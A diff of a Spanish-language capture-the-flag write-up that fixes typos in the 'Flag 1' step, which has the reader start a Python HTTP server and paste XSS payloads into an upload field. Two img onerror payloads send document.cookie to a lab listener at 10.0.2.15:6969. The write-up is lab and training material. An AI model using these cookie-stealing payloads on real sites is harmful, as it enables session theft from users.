@@ -10,11 +10,10 @@
 
 ### Flag 1 
 
-Creamos un usuario, levantamos un servidor en python con `python -m http.server 6969` dentro de los upload, en el apartado de texto plano alguno de los siguientes **XSS**
-
+Creamos un usuario, levantamos un servidor en python con `python -m http.server 6969` y dentro de los upload, en el apartado de texto plano alguno de los siguientes **XSS**
 
 ```html
-<!-- esta primera peude buggear la web, reinciadno la VM se arreglar -->
+<!-- esta primera puede buggear la web, reinciadno la VM se arreglar -->
 <img src=x onerror="document.location='http://10.0.2.15:6969/cookie?data='+document.cookie;">
 <!-- segunda opción -->
 <img src=x onerror="fetch('http://10.0.2.15:6969/cookie?data='+document.cookie)">
